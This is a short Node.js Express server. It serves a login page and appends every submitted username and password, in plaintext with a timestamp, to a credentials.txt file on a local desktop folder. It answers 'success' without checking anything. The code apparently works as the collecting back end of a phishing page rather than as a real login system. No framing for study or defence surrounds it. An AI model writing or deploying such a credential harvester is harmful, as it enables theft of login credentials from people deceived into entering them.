const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Path logic: try Windows desktop folder first, fallback to ./data
const WINDOWS_PATH = 'C:\\Users\\donut\\Desktop\\data';
const SAVE_DIR = fs.existsSync(WINDOWS_PATH) ? WINDOWS_PATH : path.join(__dirname, 'data');
const SAVE_FILE = path.join(SAVE_DIR, 'credentials.txt');

if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR, { recursive: true });

app.use(express.json());
app.use(express.static(__dirname));

app.get('/', (req, res) => res.sendFile('app.html', { root: __dirname }));

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'Missing fields' });

  const logLine = `[${new Date().toISOString()}] Username: ${username} | Password: ${password}\n`;
  try {
    fs.appendFileSync(SAVE_FILE, logLine, 'utf8');
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Write failed' });
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}\nSaving to: ${SAVE_FILE}`));
